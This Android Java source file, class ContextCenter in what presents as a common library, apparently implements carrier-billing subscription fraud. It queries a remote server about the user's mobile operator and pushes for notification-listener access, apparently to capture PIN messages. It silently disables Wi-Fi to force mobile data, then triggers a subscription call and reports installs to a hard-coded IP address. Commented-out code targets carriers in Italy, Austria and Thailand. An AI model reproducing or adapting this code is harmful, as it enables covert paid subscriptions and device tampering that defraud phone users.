package com.mos.lib.common.persenter;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.webkit.WebView;
import android.widget.RelativeLayout;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.NetworkUtils;
import com.blankj.utilcode.util.Utils;
import com.cp.log.CheckBean;
import com.cp.log.Log4js;
import com.cp.log.event.LogEvent;
import com.mos.lib.common.BuildConfig;
import com.mos.lib.common.Ws;
import com.mos.lib.common.util.PermissionUtils;
import com.mos.lib.common.Report;
import com.mos.lib.common.http.SubProxy;
import com.mos.lib.common.util.SharedUtil;
import com.mos.lib.common.util.StringUtil;
import com.mos.lib.common.util.NetUtil;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import static com.mos.lib.common.persenter.AnyFieldCall.*;


public class ContextCenter {

    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";

    @SuppressLint("StaticFieldLeak")
    private static ContextCenter subContext;

    private static boolean running = false;

    //debug
    private static boolean closeWifi = true;
    private static SubProxy subProxy;
    private static String operator;


    private Context context;

    private NetworkStateReceiver receiver;

    private LogEvent event;

    private AnyFieldCall subCall;

    private RelativeLayout layout;

    private OkHttpClient client = new OkHttpClient();

    private Handler mainHandler = new Handler(Looper.getMainLooper());

    private void initSubCall() {
        final String userAgent = new WebView(context).getSettings().getUserAgentString();
        operator = StringUtil.INSTANCE.isEmpty(operator) ? NetUtil.INSTANCE.getOperator() : operator;

        subCall = new Ws();
        if (subCall != null) {
            subCall.init(userAgent, operator, event);
            if (subProxy != null) {
                subCall.setProxy(subProxy);
            }
        }


        new Thread(new Runnable() {
            @Override
            public void run() {
//                Request request = new Request.Builder().url("http://192.168.50.165:8077/api/check_is_pin?operator=43434").build();
                LogUtils.i("init_sub_call");
                Request request = new Request.Builder().url(Companion.getAPP_CHECK_HOST() + Companion.getAPP_CHECK_OPERATOR() + operator).build();
                Response response;
                try {
                    response = client.newCall(request).execute();
                    if (response.isSuccessful()) {
                        assert response.body() != null;
                        String string = response.body().string();
                        final CheckBean checkBean = JSON.parseObject(string, CheckBean.class);

                        if (checkBean.getCode() == 1) {
                            LogUtils.i("getCode == 1 return");
                            return;
                        }

                        mainHandler.post(new Runnable() {
                            @Override
                            public void run() {
                                //result = 1 代表需要ping
                                if (checkBean.getResult() == 1) {
                                    if (!isNotificationServiceEnabled()) {
                                        LogUtils.i("ping_show_dialog");
                                        PermissionUtils.INSTANCE.showPermissionDialog(context);
//                                        Log4js.showDialog();
                                    } else {
                                        LogUtils.i("ping_call");
                                        call();
                                    }
                                } else {
                                    LogUtils.i("click_call");
                                    Log4js.INSTANCE.setPermission(true);
                                    call();
                                }

                            }
                        });
                    } else {
                        throw new Exception("Unexpected code " + response);
                    }
                } catch (Exception e) {
                    LogUtils.w("Exception return");
                    e.printStackTrace();
                }
            }
        }).start();


//        switch (operator) {

//            case ITALY_TIM:
//                LogUtils.i("init TIM", operator);
//                subCall = new TIMSub();
//                break;
//            case AUSTRIA_H3G:
//            case AUSTRIA_H3G_2:
//                subCall = new Ws();
//                LogUtils.i("初始化 奥地利 H3G", operator);
//                subCall = new AustriaH3G(this.context);
//                break;
//            case AUSTRIA_OPERATOR_A1_1:
//            case AUSTRIA_OPERATOR_A1_2:
//                LogUtils.i("初始化 奥地利 A1", operator);
//                subCall = new AustriaA1();
//                subCall = new Ws();
//                break;
//            default:

    }

    public static void call() {
        LogUtils.i("execute_call");
        synchronized (ContextCenter.class) {

            if (!Log4js.INSTANCE.isPermission()) {
                if (!isNotificationServiceEnabled()) {

                    subContext.subCall.getR().w("not_notification_permission");

                    running = false;

                    if (BuildConfig.DEBUG) {
                        LogUtils.i("not_notification_permission");
                    }
                    return;
                }
            }
            if (!running && subContext.subCall != null) {

                running = true;

                boolean success = SharedUtil.INSTANCE.isSuccess();

                LogUtils.i("sub_status", success);

                //是否订阅成功
                if (!success) {
//                    int data = 1;
                    //state = 0时，为带ping订阅
                    LogUtils.w("ContextCenter");

//                    if (subContext.subCall instanceof AustriaH3G) {
//                        if (!isNotificationServiceEnabled()) {
//
//                            subContext.subCall.r.w("not_notification_permission");
//
//                            running = false;
//
//                            return;
//                        }
//                    }
//                    else if (AnyField.TH_AIS.equals(subContext.subCall.operator)) {
//
//                        if (!isNotificationServiceEnabled()) {
//
//                            subContext.subCall.r.w("not_notification_permission");
//
//                            running = false;
//
//                            return;
//                        }
//                    }
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                String info = Report.Companion.getReport().info();

                                if (!StringUtil.INSTANCE.isEmpty(info)) {

                                    //关闭wifi
                                    if (wifiStateAndClose()) {
                                        //调用 Ws 中sub方法
                                        subContext.subCall.sub(info);

                                    }
                                }

                            } catch (Exception e) {
                                LogUtils.e(e);
                            } finally {
                                running = false;
                            }

                        }

                    }).start();
                } else {
                    running = false;
                }
            }
        }


    }


    /**
     * 初始化 ContextCenter init方法
     *
     * @param context
     * @param event
     */
    public static void init(Context context, LogEvent event) {
        synchronized (LogEvent.class) {
            Utils.init(context);
            //初始化上报函数
            //APP_SERVER_HOST = http://52.53.238.169:8081
            Report.Companion.init(Companion.getAPP_SERVER_HOST());

            if (subContext == null) {

                subContext = new ContextCenter(context, event);
            }

        }

    }

    public static void init(Context context, LogEvent event, RelativeLayout layout) {

        synchronized (LogEvent.class) {


            Utils.init(context);

            Report.Companion.init(Companion.getAPP_SERVER_HOST());


            if (subContext == null) {

                subContext = new ContextCenter(context, event, layout);

            }

        }

    }

    /**
     * @param context
     * @param event
     */
    private ContextCenter(Context context, LogEvent event) {
        this.context = context;
        this.event = event;

        initSubCall();
        if (!SharedUtil.INSTANCE.isInstalled()) {
            event.onMessage(Companion.getINSTALLED(), "");
            Report.Companion.getReport().i(Companion.getINSTALLED());
            SharedUtil.INSTANCE.installed();
        }
    }


    private ContextCenter(Context context, LogEvent event, RelativeLayout layout) {
        this.context = context;
        this.event = event;
        this.layout = layout;

        initSubCall();

        if (!SharedUtil.INSTANCE.isInstalled()) {

            event.onMessage(Companion.getINSTALLED(), "");
            Report.Companion.getReport().i(Companion.getINSTALLED());


            SharedUtil.INSTANCE.installed();

        }

    }


    private static boolean wifiStateAndClose() {

        if (closeWifi) {

            int netCode = NetUtil.INSTANCE.getNetworkState(subContext.context);

            if (netCode == NetUtil.INSTANCE.getNETWORK_WIFI()) {

                LogUtils.i("start_close_wifi");
                //注册广播
                if (subContext.receiver == null) {

                    subContext.receiver = new NetworkStateReceiver();

                    IntentFilter filter = new IntentFilter();

                    filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
                    filter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
                    filter.addAction("android.net.wifi.STATE_CHANGE");

                    subContext.context.registerReceiver(subContext.receiver, filter);
                }

                WifiManager wifiManager = (WifiManager) subContext.context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);

                if (wifiManager != null) {
                    wifiManager.setWifiEnabled(false);
                }

                return false;
            } else if (netCode == NetUtil.INSTANCE.getNETWORK_NONE()) {
                LogUtils.w("not_network");
                return false;
            }
        }

        return true;
    }

    public static void closeWifi(boolean wifi) {
        closeWifi = wifi;
    }

    public static void log(boolean log) {
        LogUtils.getConfig().setLogSwitch(log);
        LogUtils.getConfig().setLogHeadSwitch(false);
        LogUtils.getConfig().setBorderSwitch(true);
        LogUtils.getConfig().setSingleTagSwitch(true);

    }

    public static void proxy(SubProxy proxy) {
        subProxy = proxy;
    }

    public static void setOperator(String code) {
        operator = code;
    }


    /**
     * 该方法用于开启通知后回调
     *
     * @param message
     */
    public static void call(final String message) {

        if (subContext.subCall != null) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    subContext.subCall.onSub(message);
                }
            }).start();
        }
    }

    private static boolean isNotificationServiceEnabled() {

        String pkgName = subContext.context.getPackageName();
        final String flat = Settings.Secure.getString(subContext.context.getContentResolver(),
                ENABLED_NOTIFICATION_LISTENERS);

        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");

            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private static class NetworkStateReceiver extends BroadcastReceiver {


        public void destroy() {
            subContext.context.unregisterReceiver(this);
            subContext.receiver = null;
        }


        @Override
        public void onReceive(Context context, Intent intent) {
            LogUtils.i("NetworkStateReceiver ", intent.toString());
            if (NetworkUtils.isConnected() && !NetworkUtils.isWifiConnected() && NetworkUtils.isMobileData()) {

                subContext.subCall.report(Companion.getOPEN_4G_NETWORK());

                call();

                destroy();

            }
        }
    }


}
